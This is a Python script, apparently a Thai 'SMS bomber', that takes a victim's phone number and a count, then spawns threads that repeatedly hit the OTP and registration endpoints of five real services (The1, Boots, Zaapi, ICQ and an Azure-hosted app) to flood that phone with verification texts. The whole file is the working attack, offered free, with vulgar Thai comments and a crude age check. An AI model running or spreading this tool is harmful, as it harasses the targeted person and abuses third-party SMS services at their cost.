import requests,json #ของฟรี
import os #ห้ามขาย
import time #apiฟรี
import threading #ขายทำควยไร
from requests import get #ทำโดย สคริปต์ หรรษา
from re import search #EH4404
from requests import Session #errorhacker
from threading import Thread #ฟรีนะน้อง
os.system('clear') #ห้ามรับยิง
print("") #รับยิงหาแม่งมึงอะ
print("""\033[1;96m
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝\033[95m by KAKA""") 
print ("")
name = input("\033[1;94mname :\033[1;93m ")
time.sleep(1) #ดีเลย์ 1 วิ
print("") #เจอใครเอาไปขายแจ้งทันที
password = input("\033[1;94mpass : \033[95m") #เจอใครเอาไปรับยิงแจ้งด้วย
time.sleep(1)
print("") #ขายหาพ่อมึงหรอ 
old = int(input("\033[1;94mold : \033[1;96m")) #กุแจกโค้ดฟรีไอสัส
time.sleep(1) 

if old>=12: #อายุตำ่ำกว่า 12 ใช้ไม่ได้นะ
	print ("")
	print("\033[92mโตแล้วนิ มีหมอยยัง") 
	time.sleep(2)
	os.system("clear")
	print ("")
	print ("\033[1;96mEH4404 by สคริปต์ หรรษา") 
	print ("")
	phone = input("\033[1;93mเบอร์ : \033[91m") 
	print ("")
	jam = int(input("\033[1;93mจำนวน : \033[1;94m")) 
	print ("")
	
	def api():
		requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
		print ("\033[91mattack") #api 1
		
	def api2():
		requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
		print ("\033[91mattack") #api2
		
	def api3():
		requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
		print ("\033[91mattack") #api3
		
	def api4():
		requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
		print ("\033[91mattack") #api4
		
	def api5():
		requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
		print ("\033[91mattack") #api5
		
	for i in range(jam): #loop
		threading.Thread(target=api).start() #ห้ามขาย
		threading.Thread(target=api2).start() #ห้ามรับยิง
		threading.Thread(target=api3).start() #เครดิต : สมชาย สบายจัง
		threading.Thread(target=api4).start() #แจกต่อให้เครดิตด้วยก็ดี
		threading.Thread(target=api5).start() #ไปละ
    
else:
    print("\033[91mยังเด็กอยู่ หมอยยังไม่ขึ้นนิ")
    print ("")
    print ("\033[91mรอหมอยขึ้นก่อน ค่อยใช้")
    print ("")
    
